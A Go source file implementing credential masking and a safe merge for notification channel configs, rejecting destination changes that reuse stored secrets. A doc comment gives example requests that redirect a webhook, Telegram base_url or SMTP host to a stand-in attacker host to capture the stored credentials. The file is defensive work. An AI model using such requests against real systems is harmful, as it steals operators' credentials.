package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of masked values. When the API echoes credentials it replaces the real content
// with a value carrying this prefix, and the update endpoint interprets a value with this prefix as "keep the stored value unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so a bit of identifying info can ride along
// (see MaskedValue), letting users tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 chars of the original as an identifying hint
//
// Exposing only the last 6 chars is deliberate: a webhook URL's identifying info is in its tail (e.g. the WeCom key,
// the Feishu bot id), while the prefix is identical across bots and useless for identification. The last 6 chars are
// not enough to recover the credential, but enough for the person configuring it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified since echoed by the API).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config: better for the UI to show
// "config unavailable" than to echo back raw content that may contain credentials when the type is unrecognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole: judging each sub-key would require
		// every channel to declare yet another set of "which sub-keys are credentials" rules, far more complexity than benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller did not take a position on
// the credential fields". It is returned instead of silently allowing or silently dropping credentials; see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly addressed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter a new value, or explicitly leave it empty if credentials are no longer needed. " +
		"The original credentials are only valid for the old destination; reusing them would hand them to the new one."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of a "destination change".
//
// It replaces bare MergeConfig on the channel update path, closing a path that was verified to work in practice:
// the destination (where messages go) and the credentials (which identity sends them) are two independent sets of
// fields, and MergeConfig keeps the stored value for any "unmentioned key". So anyone able to PATCH a channel could,
// by **changing only the address and saying nothing about credentials**, make the server send the real stored
// credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header sent with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and doesn't rely on redirects (so refusing cross-host redirects doesn't stop it),
// and it directly defeats the goal of this package's masking: "credentials are never echoed to the browser".
//
// Rule: as soon as any destination key changes to a new value, the caller must explicitly address **every** credential key:
//   - provide a new value → use it
//   - explicitly send an empty string → the field no longer needs credentials (keeps the clearing semantics)
//   - echo back the masked value / not mention the key at all → rejected
//
// The third case is also rejected because a "masked value" means exactly "keep the old credential", and the old
// credential is only valid for the old destination. We deliberately do not "auto-drop credentials": for optional
// credential fields (webhook headers, email password) that would silently become "auth is gone but the endpoint
// returns 200", harder to debug than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers is an object) embeds the mask literal,
	// the caller has stuffed the "keep original" sentinel inside a structure. MergeConfig only treats "a string with
	// the prefix" as masked, so this shape would be stored as an ordinary object: the literal "__masked__" actually
	// lands in the database, and auth silently breaks later with no error. Better to reject it.
	//
	// This check must come **first**: when the address is unchanged we return early, so placing it later would cover
	// only the "address changed" path (the first version had exactly this mistake, and the tests caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: normal merge (masked keeps original, empty string clears, others overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require every credential key to be explicitly addressed.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". Object fields like webhook headers can only be masked
// as a whole (written as the string "__masked__") or submitted as a whole; putting the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left empty as a whole to keep the existing value, or submitted as a whole new value; mask placeholders cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization is used to also handle type
// differences: the frontend submits a port as a number while the stored value reads back as float64, so == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key absent" are the same state in this config
// model, because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalization,
// an optional destination field that is always left empty (Telegram's base_url is the only such field: empty means
// the official address) would follow this path:
//
//	base_url:"" stored on create  →  key deleted by MergeConfig on first save
//	→ on second save incoming is "" and stored lacks the key, judged as "address changed"
//	→ credentials are masked → 400 "destination has changed; please also re-enter the credential fields"
//
// Every save after that would fail unless the user re-pastes the Bot Token, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a config value is "empty".
// The criterion must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// otherwise there is a gap where "MergeConfig thinks it should be deleted, sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used to update channel config.
//
// Rules:
//   - keys in incoming with a masked value → keep stored's original value (the user didn't change this field)
//   - keys in incoming with an empty string → treated as an explicit clear; the key is deleted
//   - other keys → overwritten with incoming's value
//   - keys in stored but not in incoming → kept (partial update semantics)
//
// Whether an empty string means "clear" needs to be explicit: frontend forms submit unfilled fields as empty strings,
// and writing that as a valid value would really clear fields meant to be "left empty to keep the original".
// Explicit clearing is chosen here because users have no other way to clear a misconfigured field
// (omitting the field could distinguish "not provided" from "provided empty", but the UI doesn't use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
